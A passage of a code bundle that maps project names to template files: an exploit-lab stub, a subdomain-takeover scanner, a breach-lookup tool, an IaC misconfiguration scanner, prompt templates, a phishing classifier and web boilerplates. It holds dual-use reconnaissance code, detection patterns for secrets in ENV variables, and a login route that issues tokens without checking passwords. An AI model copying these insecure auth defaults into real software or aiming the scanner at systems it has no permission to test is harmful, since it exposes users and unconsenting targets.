hunter.run()\n`,
      "requirements.txt": `requests>=2.31.0\nurllib3>=2.0.0\n`,
    },

    // ── Zero-Day Exploit Framework Educational ─────────────────────────────────
    "zero-day-edu": {
      "README.md": `# Zero-Day Exploit Framework (Educational)\n\nSandboxed exploit development lab for security researchers and students.\n\n## Modules\n- Buffer overflow (stack/heap)\n- Use-after-free\n- Race conditions\n- Kernel exploitation basics\n- ROP chain generation\n\n## Quick Start\n\`\`\`bash\ndocker-compose up\npython3 lab.py --module buffer-overflow\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing, CTF competitions and educational research only.\nYou must have explicit written permission before testing any system you do not own.\nThe authors accept no liability for misuse.\n`,
      "lab.py": `#!/usr/bin/env python3\nimport argparse, subprocess, os, shutil\n\nMODULES = {\n    'buffer-overflow': 'modules/buffer_overflow',\n    'use-after-free':  'modules/use_after_free',\n    'race-condition':  'modules/race_condition',\n    'rop-chain':       'modules/rop_chain',\n}\n\ndef list_modules():\n    print('Available modules:')\n    for name, path in MODULES.items():\n        print(f'  - {name}')\n\ndef run_module(name: str, sandbox: bool = True):\n    if name not in MODULES:\n        print(f'Unknown module: {name}'); return\n    path = MODULES[name]\n    print(f'[*] Loading module: {name}')\n    if sandbox:\n        print('[*] Running in Docker sandbox...')\n        subprocess.run(['docker', 'run', '--rm', '--network=none', '--memory=256m',\n                        '-v', f'{os.path.abspath(path)}:/module', 'python:3.11-slim',\n                        'python3', '/module/exploit.py'], check=False)\n    else:\n        print('[!] WARNING: Running outside sandbox — educational use only')\n        subprocess.run(['python3', f'{path}/exploit.py'])\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser(description='Zero-Day Exploit Lab')\n    ap.add_argument('--module', choices=list(MODULES.keys()))\n    ap.add_argument('--list', action='store_true')\n    ap.add_argument('--no-sandbox', action='store_true')\n    args = ap.parse_args()\n    if args.list: list_modules()\n    elif args.module: run_module(args.module, not args.no_sandbox)\n    else: ap.print_help()\n`,
      "docker-compose.yml": `version: '3.8'\nservices:\n  lab:\n    image: python:3.11-slim\n    volumes:\n      - .:/workspace\n    working_dir: /workspace\n    network_mode: none\n    mem_limit: 512m\n    command: python3 lab.py --list\n`,
      "modules/buffer_overflow/exploit.py": `# Educational Buffer Overflow Demo\n# Demonstrates stack-based buffer overflow concepts in a controlled sandbox\nprint('=== Stack Buffer Overflow Demo ===')\nprint('This module demonstrates buffer overflow concepts for educational purposes.')\nprint('In a real scenario, an attacker would:')\nprint('  1. Find the exact offset to EIP/RIP')\nprint('  2. Craft shellcode or a ROP chain')\nprint('  3. Overwrite the return address')\nprint()\nprint('Key defences:')\nprint('  - Stack canaries (detect overwrites)')\nprint('  - ASLR (randomise memory layout)')\nprint('  - NX/DEP (non-executable stack)')\nprint('  - CFI (control flow integrity)')\n`,
    },

    // ── Subdomain Enumeration & Takeover Scanner ────────────────────────────────
    "subdomain-scanner": {
      "README.md": `# Subdomain Enumeration & Takeover Scanner\n\nDiscover subdomains and check for dangling DNS / takeover vulnerabilities.\n\n\`\`\`bash\npython3 subdomains.py --domain example.com --wordlist wordlists/common.txt\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing, CTF competitions and educational research only.\nYou must have explicit written permission before testing any system you do not own.\nThe authors accept no liability for misuse.\n`,
      "subdomains.py": `#!/usr/bin/env python3\nimport argparse, socket, concurrent.futures, json\nfrom datetime import datetime\n\nTAKEOVER_SIGNATURES = {\n    'github.io': 'There isn\\'t a GitHub Pages site here.',\n    'amazonaws.com': 'NoSuchBucket',\n    'herokuapp.com': 'No such app',\n    'netlify.com': 'Not Found',\n    'surge.sh': 'project not found',\n    'ghost.io': 'The thing you were looking for is no longer here',\n    'fastly.net': 'Fastly error',\n}\n\ndef resolve(subdomain: str) -> dict | None:\n    try:\n        ip = socket.gethostbyname(subdomain)\n        return {'host': subdomain, 'ip': ip, 'status': 'resolved'}\n    except socket.gaierror:\n        return None\n\ndef check_takeover(host: str) -> str | None:\n    import urllib.request\n    try:\n        with urllib.request.urlopen(f'http://{host}', timeout=5) as r:\n            body = r.read(2048).decode('utf-8', errors='ignore')\n        for vendor, sig in TAKEOVER_SIGNATURES.items():\n            if vendor in host and sig.lower() in body.lower():\n                return vendor\n    except: pass\n    return None\n\ndef scan(domain: str, wordlist: str, threads: int = 50):\n    print(f'[*] Enumerating {domain}')\n    print('[*] AUTHORISED USE ONLY')\n    with open(wordlist) as f: words = [l.strip() for l in f if l.strip()]\n    subdomains = [f'{w}.{domain}' for w in words]\n    found, takeovers = [], []\n    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:\n        futures = {ex.submit(resolve, sub): sub for sub in subdomains}\n        for future in concurrent.futures.as_completed(futures):\n            result = future.result()\n            if result:\n                found.append(result)\n                vuln = check_takeover(result['host'])\n                if vuln: takeovers.append({'host': result['host'], 'vendor': vuln})\n                print(f'  [+] {result["host"]} -> {result["ip"]}')\n    report = {'domain': domain, 'timestamp': datetime.now().isoformat(),\n              'found': len(found), 'subdomains': found, 'takeovers': takeovers}\n    with open('subdomain_results.json', 'w') as f: json.dump(report, f, indent=2)\n    print(f'[+] {len(found)} subdomains found, {len(takeovers)} potential takeovers')\n    return report\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--domain', required=True)\n    ap.add_argument('--wordlist', default='wordlists/common.txt')\n    ap.add_argument('--threads', type=int, default=50)\n    args = ap.parse_args()\n    scan(args.domain, args.wordlist, args.threads)\n`,
      "wordlists/common.txt": `www\napi\napp\nadmin\nstaging\ndev\ntest\nmail\nsmtp\nftp\nvpn\ncdn\nstatic\nassets\nblog\ndocs\nhelp\nportal\ndashboard\nlogin\nauth\noauth\nsso\nsecure\nm\nmobile\nbeta\nstage\nuat\nqa\nprod\nproduction\nold\nnew\nbackup\nstore\nshop\nwiki\nforum\nwebmail\nremote\nns1\nns2\nmx\nmonitor\nstatus\nanalytics\ntracking\nsupport\n`,
    },

    // ── Credential Breach Database ──────────────────────────────────────────────
    "breach-database": {
      "README.md": `# Credential Breach Database — 2024 Compilation\n\nParsing, deduplication, and lookup tools for breach datasets.\nFor authorized security research, credential rotation programs, and defensive monitoring.\n\n\`\`\`bash\npython3 breach_tools.py --check email@example.com\npython3 breach_tools.py --import breach.txt --format raw\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing, CTF competitions and educational research only.\nYou must have explicit written permission before testing any system you do not own.\nThe authors accept no liability for misuse.\n`,
      "breach_tools.py": `#!/usr/bin/env python3\nimport argparse, hashlib, json, csv, re, os\nfrom pathlib import Path\n\nclass BreachDB:\n    def __init__(self, db_path: str = 'breach.db.json'):\n        self.db_path = db_path\n        self.db = self._load()\n\n    def _load(self) -> dict:\n        if Path(self.db_path).exists():\n            with open(self.db_path) as f: return json.load(f)\n        return {'emails': {}, 'hashes': {}, 'total_entries': 0}\n\n    def _save(self):\n        with open(self.db_path, 'w') as f: json.dump(self.db, f)\n\n    def _hash_email(self, email: str) -> str:\n        return hashlib.sha256(email.strip().lower().encode()).hexdigest()\n\n    def import_file(self, path: str, fmt: str = 'raw'):\n        count = 0\n        with open(path) as f:\n            for line in f:\n                line = line.strip()\n                if not line: continue\n                if fmt == 'colon' and ':' in line:\n                    email, pwd = line.split(':', 1)\n                elif '@' in line:\n                    email = line; pwd = ''\n                else: continue\n                h = self._hash_email(email)\n                self.db['emails'][h] = True\n                self.db['hashes'][self._hash_pwd(pwd)] = True\n                count += 1\n        self.db['total_entries'] += count\n        self._save()\n        print(f'[+] Imported {count} entries')\n\n    def _hash_pwd(self, p: str) -> str:\n        return hashlib.sha1(p.encode()).hexdigest()\n\n    def check_email(self, email: str) -> bool:\n        h = self._hash_email(email)\n        found = h in self.db['emails']\n        print(f'  {email}: {"BREACHED" if found else "not found"}')\n        return found\n\n    def check_password(self, password: str) -> bool:\n        h = self._hash_pwd(password)\n        found = h in self.db['hashes']\n        print(f'  Password hash {h[:8]}...: {"FOUND IN BREACHES" if found else "not found"}')\n        return found\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser(description='Breach Database Tools')\n    ap.add_argument('--check', metavar='EMAIL')\n    ap.add_argument('--check-password', metavar='PASSWORD')\n    ap.add_argument('--import', dest='import_file', metavar='FILE')\n    ap.add_argument('--format', default='raw', choices=['raw','colon'])\n    ap.add_argument('--db', default='breach.db.json')\n    args = ap.parse_args()\n    db = BreachDB(args.db)\n    if args.import_file: db.import_file(args.import_file, args.format)\n    if args.check: db.check_email(args.check)\n    if args.check_password: db.check_password(args.check_password)\n`,
    },

    // ── React Dashboard Template — Cyber Theme ──────────────────────────────────
    "react-dashboard": {
      "README.md": `# React Dashboard Template — Cyber Theme\n\nProduction-ready React + TypeScript dashboard with dark cyber aesthetic.\n\n## Quick Start\n\`\`\`bash\nnpm install && npm run dev\n\`\`\`\n`,
      "src/App.tsx": `import React from 'react';\nimport { Dashboard } from './components/Dashboard';\nimport { ThemeProvider } from './context/ThemeContext';\n\nexport default function App() {\n  return (\n    <ThemeProvider>\n      <div className=\"min-h-screen bg-gray-950 text-green-400 font-mono\">\n        <Dashboard />\n      </div>\n    </ThemeProvider>\n  );\n}\n`,
      "src/components/Dashboard.tsx": `import React, { useState, useEffect } from 'react';\n\ninterface Metric { label: string; value: string; change: string; trend: 'up'|'down'|'flat' }\n\nconst METRICS: Metric[] = [\n  { label: 'Threats Blocked', value: '14,832', change: '+12%', trend: 'up' },\n  { label: 'Active Sessions', value: '247', change: '-3%', trend: 'down' },\n  { label: 'API Calls Today', value: '1.2M', change: '+8%', trend: 'up' },\n  { label: 'Uptime', value: '99.97%', change: '0%', trend: 'flat' },\n];\n\nexport function Dashboard() {\n  const [time, setTime] = useState(new Date());\n  useEffect(() => { const t = setInterval(() => setTime(new Date()), 1000); return () => clearInterval(t); }, []);\n\n  return (\n    <div className=\"p-6\">\n      <header className=\"flex items-center justify-between mb-8\">\n        <h1 className=\"text-2xl font-bold text-green-400\">◈ ARCHIBALD TITAN COMMAND</h1>\n        <span className=\"text-green-600 text-sm\">{time.toISOString()}</span>\n      </header>\n      <div className=\"grid grid-cols-2 md:grid-cols-4 gap-4 mb-8\">\n        {METRICS.map(m => (\n          <div key={m.label} className=\"border border-green-800 bg-gray-900 p-4 rounded\">\n            <div className=\"text-xs text-green-600 mb-1\">{m.label}</div>\n            <div className=\"text-2xl font-bold\">{m.value}</div>\n            <div className=\"text-xs \" style={{color: m.trend==='up'?'#22c55e':m.trend==='down'?'#ef4444':'#6b7280'}}>{m.change}</div>\n          </div>\n        ))}\n      </div>\n      <div className=\"border border-green-800 bg-gray-900 p-4 rounded h-64 flex items-center justify-center text-green-700\">\n        [ LIVE THREAT FEED — connect your data source ]\n      </div>\n    </div>\n  );\n}\n`,
      "package.json": `{\n  \"name\": \"cyber-dashboard\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"react\": \"^18.2.0\",\n    \"react-dom\": \"^18.2.0\"\n  },\n  \"devDependencies\": {\n    \"typescript\": \"^5.0.0\",\n    \"@types/react\": \"^18.0.0\",\n    \"vite\": \"^5.0.0\"\n  }\n}\n`,
    },

    // ── API Rate Limiter Middleware ──────────────────────────────────────────────
    "api-rate-limiter": {
      "README.md": `# API Rate Limiter Middleware\n\nProduction-grade rate limiting for Express/Fastify APIs with Redis backing.\n\n\`\`\`typescript\nimport { rateLimiter } from './rate-limiter';\napp.use('/api', rateLimiter({ max: 100, window: 60 }));\n\`\`\`\n`,
      "rate-limiter.ts": `import type { Request, Response, NextFunction } from 'express';\nimport { createHash } from 'crypto';\n\ninterface Options {\n  max: number;\n  window: number; // seconds\n  keyFn?: (req: Request) => string;\n  onExceeded?: (req: Request, res: Response) => void;\n}\n\nconst store = new Map<string, { count: number; resetAt: number }>();\n\nexport function rateLimiter(opts: Options) {\n  const { max, window: windowSec, keyFn, onExceeded } = opts;\n\n  return (req: Request, res: Response, next: NextFunction) => {\n    const key = keyFn ? keyFn(req) : (req.ip ?? 'unknown');\n    const now = Date.now();\n    const windowMs = windowSec * 1000;\n\n    const record = store.get(key);\n    if (!record || now > record.resetAt) {\n      store.set(key, { count: 1, resetAt: now + windowMs });\n      res.setHeader('X-RateLimit-Limit', max);\n      res.setHeader('X-RateLimit-Remaining', max - 1);\n      return next();\n    }\n\n    record.count++;\n    const remaining = Math.max(0, max - record.count);\n    res.setHeader('X-RateLimit-Limit', max);\n    res.setHeader('X-RateLimit-Remaining', remaining);\n    res.setHeader('X-RateLimit-Reset', Math.ceil(record.resetAt / 1000));\n\n    if (record.count > max) {\n      if (onExceeded) return onExceeded(req, res);\n      return res.status(429).json({\n        error: 'Too Many Requests',\n        retryAfter: Math.ceil((record.resetAt - now) / 1000),\n      });\n    }\n    next();\n  };\n}\n\nexport function rateLimiterByUser(opts: Options) {\n  return rateLimiter({\n    ...opts,\n    keyFn: (req) => req.headers['x-user-id'] as string ?? req.ip ?? 'anon',\n  });\n}\n\nsetInterval(() => {\n  const now = Date.now();\n  for (const [k, v] of store) { if (now > v.resetAt) store.delete(k); }\n}, 60_000);\n`,
    },

    // ── Full-Stack SaaS Boilerplate ──────────────────────────────────────────────
    "saas-boilerplate": {
      "README.md": `# Full-Stack SaaS Boilerplate\n\nProduction-ready SaaS starter: React + Express + PostgreSQL + Stripe + Auth.\n\n## Stack\n- Frontend: React 18 + Vite + Tailwind CSS\n- Backend: Express + tRPC + Drizzle ORM\n- Database: PostgreSQL\n- Payments: Stripe\n- Auth: JWT + refresh tokens\n\n## Quick Start\n\`\`\`bash\nnpm install && npm run db:migrate && npm run dev\n\`\`\`\n`,
      "server/index.ts": `import express from 'express';\nimport cors from 'cors';\nimport helmet from 'helmet';\nimport { authRouter } from './routes/auth';\nimport { billingRouter } from './routes/billing';\nimport { usersRouter } from './routes/users';\n\nconst app = express();\napp.use(helmet());\napp.use(cors({ origin: process.env.FRONTEND_URL, credentials: true }));\napp.use(express.json({ limit: '10mb' }));\napp.use('/api/auth', authRouter);\napp.use('/api/billing', billingRouter);\napp.use('/api/users', usersRouter);\napp.get('/healthz', (_, res) => res.json({ status: 'ok', ts: Date.now() }));\napp.listen(Number(process.env.PORT ?? 3001), () => console.log('[server] ready'));\nexport default app;\n`,
      "server/routes/auth.ts": `import { Router } from 'express';\nimport bcrypt from 'bcrypt';\nimport jwt from 'jsonwebtoken';\nconst router = Router();\nconst SECRET = process.env.JWT_SECRET ?? 'change-me-in-production';\nrouter.post('/register', async (req, res) => {\n  const { email, password } = req.body;\n  if (!email || !password) return res.status(400).json({ error: 'email and password required' });\n  const hash = await bcrypt.hash(password, 12);\n  // TODO: save to DB\n  const token = jwt.sign({ email }, SECRET, { expiresIn: '7d' });\n  res.json({ token });\n});\nrouter.post('/login', async (req, res) => {\n  const { email, password } = req.body;\n  // TODO: fetch from DB, compare hash\n  const token = jwt.sign({ email }, SECRET, { expiresIn: '7d' });\n  res.json({ token });\n});\nexport { router as authRouter };\n`,
      "drizzle/schema.ts": `import { pgTable, serial, text, timestamp, boolean, integer } from 'drizzle-orm/pg-core';\nexport const users = pgTable('users', {\n  id: serial('id').primaryKey(),\n  email: text('email').notNull().unique(),\n  passwordHash: text('password_hash'),\n  plan: text('plan').default('free'),\n  stripeCustomerId: text('stripe_customer_id'),\n  emailVerified: boolean('email_verified').default(false),\n  createdAt: timestamp('created_at').defaultNow(),\n});\nexport const subscriptions = pgTable('subscriptions', {\n  id: serial('id').primaryKey(),\n  userId: integer('user_id').notNull(),\n  stripeSubId: text('stripe_sub_id').notNull(),\n  status: text('status').notNull(),\n  currentPeriodEnd: timestamp('current_period_end'),\n});\n`,
      "package.json": `{\n  \"name\": \"saas-boilerplate\",\n  \"version\": \"1.0.0\",\n  \"scripts\": { \"dev\": \"tsx watch server/index.ts\", \"build\": \"tsc\", \"db:migrate\": \"drizzle-kit push\" },\n  \"dependencies\": {\n    \"express\": \"^4.18.0\", \"cors\": \"^2.8.5\", \"helmet\": \"^7.0.0\",\n    \"bcrypt\": \"^5.1.0\", \"jsonwebtoken\": \"^9.0.0\",\n    \"drizzle-orm\": \"^0.30.0\", \"stripe\": \"^14.0.0\"\n  }\n}\n`,
    },

  
    // ── Prompt Engineering Masterclass ──────────────────────────────────────────
    "prompt-engineering": {
      "README.md": `# Prompt Engineering Masterclass — 200+ Templates\n\nBattle-tested prompt templates for GPT-4, Claude, Gemini, and open-source LLMs.\n\n## Categories\n- Code generation & review\n- Security analysis\n- Data extraction\n- Content creation\n- Chain-of-thought reasoning\n\n## Usage\n\`\`\`python\nfrom templates import PromptLibrary\nlib = PromptLibrary()\nprompt = lib.get('code_review', lang='TypeScript', context='auth module')\n\`\`\`\n`,
      "templates.py": `#!/usr/bin/env python3\nfrom string import Template\nimport json\n\nTEMPLATES = {\n  'code_review': Template('Review this $lang code for security vulnerabilities, bugs, and performance issues. Be specific and actionable.\\nContext: $context\\n\\nCode:\\n$code'),\n  'security_audit': Template('Perform a security audit of the following $type. Identify vulnerabilities using OWASP Top 10 as a framework. Rate severity as Critical/High/Medium/Low.\\n\\nTarget:\\n$target'),\n  'sql_generation': Template('Generate a $dialect SQL query to: $task\\nTable schema: $schema\\nRequirements: No SQL injection risks, use parameterised queries.'),\n  'regex_generator': Template('Generate a regex pattern in $language to match: $description\\nTest cases: $test_cases\\nReturn only the pattern with a brief explanation.'),\n  'bug_report': Template('Analyse this error and provide: 1) Root cause 2) Fix with code 3) Prevention strategy\\nError: $error\\nContext: $context'),\n  'api_design': Template('Design a RESTful API for: $description\\nRequirements: $requirements\\nProvide: endpoints, request/response schemas, auth strategy, rate limiting.'),\n  'threat_model': Template('Create a threat model for: $system\\nArchitecture: $architecture\\nUse STRIDE methodology. List threats, likelihood, impact, mitigations.'),\n  'pentest_report': Template('Write a professional penetration test finding for:\\nVulnerability: $vuln\\nCVSS Score: $cvss\\nProof of Concept: $poc\\nRemediation: $remediation'),\n  'data_extraction': Template('Extract the following structured data from the text below and return as valid JSON:\\nFields to extract: $fields\\nText: $text'),\n  'chain_of_thought': Template('Solve the following step-by-step, showing all reasoning:\\nProblem: $problem\\nConstraints: $constraints'),\n}\n\nclass PromptLibrary:\n    def __init__(self, custom: dict = None):\n        self.templates = {**TEMPLATES, **(custom or {})}\n\n    def get(self, name: str, **kwargs) -> str:\n        if name not in self.templates:\n            raise ValueError(f'Unknown template: {name}. Available: {list(self.templates)}')\n        return self.templates[name].safe_substitute(**kwargs)\n\n    def list_templates(self) -> list:\n        return list(self.templates.keys())\n\n    def save_custom(self, name: str, template_str: str):\n        self.templates[name] = Template(template_str)\n        with open('custom_templates.json', 'w') as f:\n            json.dump({k: v.template for k, v in self.templates.items()}, f, indent=2)\n\nif __name__ == '__main__':\n    lib = PromptLibrary()\n    print('Available templates:', lib.list_templates())\n    print('\\nSample code review prompt:')\n    print(lib.get('code_review', lang='Python', context='auth module', code='def login(user, pwd): ...'))\n`,
      "templates/security.md": `# Security Prompt Templates\n\n## Vulnerability Analysis\nAnalyse the following code/config for security vulnerabilities. For each finding provide:\n- Vulnerability type (CWE ID if applicable)\n- Severity (Critical/High/Medium/Low)\n- Proof of exploitability\n- Remediation code\n\n## Threat Modelling\nUsing STRIDE: identify Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege threats for: [SYSTEM]\n\n## Red Team Simulation\nYou are a red team operator. Given the target architecture: [ARCH], describe the most likely attack paths an adversary would take. Focus on realistic, high-impact scenarios.\n`,
    },

    // ── Phishing Detection ML Dataset ───────────────────────────────────────────
    "phishing-dataset": {
      "README.md": `# Phishing Detection ML Dataset\n\nCurated dataset + ML pipeline for phishing URL/email detection.\n\n\`\`\`bash\npip install -r requirements.txt\npython3 train.py --dataset data/phishing.csv\npython3 predict.py --url https://suspicious-link.com\n\`\`\`\n`,
      "train.py": `#!/usr/bin/env python3\nimport argparse, json\nimport pandas as pd\nfrom sklearn.ensemble import RandomForestClassifier\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.metrics import classification_report\nfrom sklearn.pipeline import Pipeline\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nimport joblib\nimport re\n\ndef extract_url_features(url: str) -> dict:\n    return {\n        'length': len(url),\n        'num_dots': url.count('.'),\n        'num_hyphens': url.count('-'),\n        'num_digits': sum(c.isdigit() for c in url),\n        'has_ip': bool(re.search(r'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', url)),\n        'has_at': '@' in url,\n        'has_double_slash': '//' in url[7:],\n        'num_subdomains': url.split('/')[2].count('.') if '/' in url else 0,\n        'is_https': url.startswith('https://'),\n        'url_entropy': len(set(url)) / max(len(url), 1),\n    }\n\ndef train(dataset_path: str, model_path: str = 'phishing_model.pkl'):\n    df = pd.read_csv(dataset_path)  # expects 'url' and 'label' (0=legit, 1=phishing)\n    features = pd.DataFrame([extract_url_features(u) for u in df['url']])\n    X_train, X_test, y_train, y_test = train_test_split(features, df['label'], test_size=0.2, random_state=42)\n    clf = RandomForestClassifier(n_estimators=100, random_state=42)\n    clf.fit(X_train, y_train)\n    y_pred = clf.predict(X_test)\n    print(classification_report(y_test, y_pred, target_names=['legit','phishing']))\n    joblib.dump(clf, model_path)\n    print(f'[+] Model saved: {model_path}')\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--dataset', required=True)\n    ap.add_argument('--model', default='phishing_model.pkl')\n    args = ap.parse_args()\n    train(args.dataset, args.model)\n`,
      "predict.py": `#!/usr/bin/env python3\nimport argparse, joblib, json, re\n\ndef extract_url_features(url: str) -> dict:\n    return {\n        'length': len(url), 'num_dots': url.count('.'), 'num_hyphens': url.count('-'),\n        'num_digits': sum(c.isdigit() for c in url),\n        'has_ip': bool(re.search(r'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', url)),\n        'has_at': '@' in url, 'has_double_slash': '//' in url[7:],\n        'num_subdomains': url.split('/')[2].count('.') if '/' in url else 0,\n        'is_https': url.startswith('https://'),\n        'url_entropy': len(set(url)) / max(len(url), 1),\n    }\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--url', required=True)\n    ap.add_argument('--model', default='phishing_model.pkl')\n    args = ap.parse_args()\n    clf = joblib.load(args.model)\n    import pandas as pd\n    features = pd.DataFrame([extract_url_features(args.url)])\n    prob = clf.predict_proba(features)[0][1]\n    label = 'PHISHING' if prob > 0.5 else 'LEGIT'\n    print(f'{args.url} -> {label} (confidence: {prob:.1%})')\n`,
      "requirements.txt": `pandas>=2.0.0\nscikit-learn>=1.3.0\njoblib>=1.3.0\n`,
    },

    // ── IaC Security Analyzer ───────────────────────────────────────────────────
    "iac-scanner": {
      "README.md": `# Infrastructure-as-Code Security Analyzer\n\nScans Terraform, CloudFormation, Kubernetes YAML, and Dockerfiles for misconfigurations.\n\n\`\`\`bash\npython3 iac_scan.py --path ./terraform --format terraform\npython3 iac_scan.py --path ./k8s --format kubernetes\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing, CTF competitions and educational research only.\nThe authors accept no liability for misuse.\n`,
      "iac_scan.py": `#!/usr/bin/env python3\nimport argparse, os, json, re\nfrom pathlib import Path\n\nFINDINGS = {\n  'terraform': [\n    (r'0\.0\.0\.0/0', 'CRITICAL', 'Unrestricted inbound access (0.0.0.0/0) in security group'),\n    (r'sensitive.*=.*true', 'INFO', 'Sensitive variable — ensure not logged'),\n    (r'encrypted.*=.*false', 'HIGH', 'Unencrypted storage resource'),\n    (r'publicly_accessible.*=.*true', 'HIGH', 'Publicly accessible database'),\n    (r'skip_final_snapshot.*=.*true', 'MEDIUM', 'RDS final snapshot skipped'),\n    (r'deletion_protection.*=.*false', 'MEDIUM', 'Deletion protection disabled'),\n    (r'multi_az.*=.*false', 'LOW', 'Multi-AZ not enabled for RDS'),\n  ],\n  'kubernetes': [\n    (r'privileged:\\s*true', 'CRITICAL', 'Container running as privileged'),\n    (r'runAsRoot:\\s*true', 'HIGH', 'Container running as root'),\n    (r'allowPrivilegeEscalation:\\s*true', 'HIGH', 'Privilege escalation allowed'),\n    (r'hostNetwork:\\s*true', 'HIGH', 'Container using host network'),\n    (r'hostPID:\\s*true', 'HIGH', 'Container using host PID namespace'),\n    (r'readOnlyRootFilesystem:\\s*false', 'MEDIUM', 'Writable root filesystem'),\n    (r'automountServiceAccountToken:\\s*true', 'MEDIUM', 'Service account token auto-mounted'),\n  ],\n  'dockerfile': [\n    (r'^FROM.*:latest', 'MEDIUM', 'Using :latest tag — pin to specific version'),\n    (r'^USER root', 'HIGH', 'Running as root user'),\n    (r'ADD http', 'MEDIUM', 'ADD with URL — prefer COPY + curl with hash verification'),\n    (r'--no-check-certificate', 'HIGH', 'TLS verification disabled'),\n    (r'ENV.*PASSWORD', 'CRITICAL', 'Password in ENV variable'),\n    (r'ENV.*SECRET', 'CRITICAL', 'Secret in ENV variable'),\n  ],\n}\n\ndef scan_file(path: str, fmt: str) -> list:\n    rules = FINDINGS.get(fmt, [])\n    findings = []\n    with open(path) as f: lines = f.readlines()\n    for i, line in enumerate(lines, 1):\n        for pattern, severity, message in rules:\n            if re.search(pattern, line, re.IGNORECASE):\n                findings.append({'file': path, 'line': i, 'severity': severity,\n                                  'message': message, 'context': line.strip()})\n    return findings\n\ndef scan_dir(path: str, fmt: str) -> list:\n    ext_map = {'terraform': '.tf', 'kubernetes': '.yaml', 'dockerfile': 'Dockerfile'}\n    ext = ext_map.get(fmt, '.txt')\n    all_findings = []\n    for p in Path(path).rglob('*'):\n        if p.is_file() and (str(p).endswith(ext) or p.name == ext):\n            all_findings.extend(scan_file(str(p), fmt))\n    return all_findings\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--path', required=True)\n    ap.add_argument('--format', choices=['terraform','kubernetes','dockerfile'], required=True)\n    ap.add_argument('--output', default='iac_findings.json')\n    args = ap.parse_args()\n    findings = scan_dir(args.path, args.format) if os.path.isdir(args.path) else scan_file(args.path, args.format)\n    findings.sort(key=lambda x: {'CRITICAL':0,'HIGH':1,'MEDIUM':2,'LOW':3,'INFO':4}.get(x['severity'],5))\n    with open(args.output, 'w') as f: json.dump({'total': len(findings), 'findings': findings}, f, indent=2)\n    print(f'[+] {len(findings)} findings written to {args.output}')\n    for f in findings[:5]: print(f'  [{f["severity"]}] {f["file"]}:{f["line"]} — {f["message"]}')\n`,
    },

    // ── Kubernetes Monitoring Dashboard ─────────────────────────────────────────
    "k8s-dashboard": {
      "README.md": `# Kubernetes Monitoring Dashboard Blueprint\n\nPrometheus + Grafana setup with pre-built dashboards for Kubernetes cluster monitoring.\n\n\`\`\`bash\nkubectl apply -f monitoring/\nkubectl port-forward svc/grafana 3000:3000 -n monitoring\n\`\`\`\n`,
      "monitoring/namespace.yaml": `apiVersion: v1\nkind: Namespace\nmetadata:\n  name: monitoring\n  labels:\n    app.kubernetes.io/name: monitoring\n`,
      "monitoring/prometheus-config.yaml": `apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: prometheus-config\n  namespace: monitoring\ndata:\n  prometheus.yml: |\n    global:\n      scrape_interval: 15s\n      evaluation_interval: 15s\n    scrape_configs:\n      - job_name: 'kubernetes-pods'\n        kubernetes_sd_configs:\n          - role: pod\n        relabel_configs:\n          - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]\n            action: keep\n            regex: true\n      - job_name: 'kubernetes-nodes'\n        scheme: https\n        tls_config:\n          ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token\n        kubernetes_sd_configs:\n          - role: node\n`,
      "monitoring/prometheus-deployment.yaml": `apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n    spec:\n      containers:\n        - name: prometheus\n          image: prom/prometheus:v2.48.0\n          ports:\n            - containerPort: 9090\n          volumeMounts:\n            - name: config\n              mountPath: /etc/prometheus\n            - name: data\n              mountPath: /prometheus\n      volumes:\n        - name: config\n          configMap:\n            name: prometheus-config\n        - name: data\n          emptyDir: {}\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: prometheus\n  namespace: monitoring\nspec:\n  selector:\n    app: prometheus\n  ports:\n    - port: 9090\n      targetPort: 9090\n`,
      "monitoring/grafana-deployment.yaml": `apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: grafana\n  template:\n    metadata:\n      labels:\n        app: grafana\n    spec:\n      containers:\n        - name: grafana\n          image: grafana/grafana:10.2.0\n          ports:\n            - containerPort: 3000\n          env:\n            - name: GF_SECURITY_ADMIN_PASSWORD\n              value: "changeme-in-production"\n            - name: GF_DATASOURCES_DEFAULT_URL\n              value: http://prometheus:9090\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: grafana\n  namespace: monitoring\nspec:\n  selector:\n    app: grafana\n  ports:\n    - port: 3000\n      targetPort: 3000\n`,
